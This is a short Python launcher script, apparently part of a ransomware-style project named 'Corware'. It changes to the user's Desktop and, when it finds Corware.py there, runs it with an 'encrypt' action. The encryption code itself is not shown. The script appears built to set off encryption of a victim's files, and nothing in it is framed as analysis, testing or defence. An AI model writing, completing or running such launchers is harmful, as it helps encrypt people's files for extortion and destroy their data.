# RUNS Corware.py #
## PROGRAMS INIT ##

import os

file = 'Corware.py'

# user_path = os.path.expanduser('~') + r'\Desktop'

change = os.chdir(os.path.expanduser('~') + r'\Desktop')

dir = os.listdir()
if file in dir:
	os.system("python Corware.py --action encrypt")
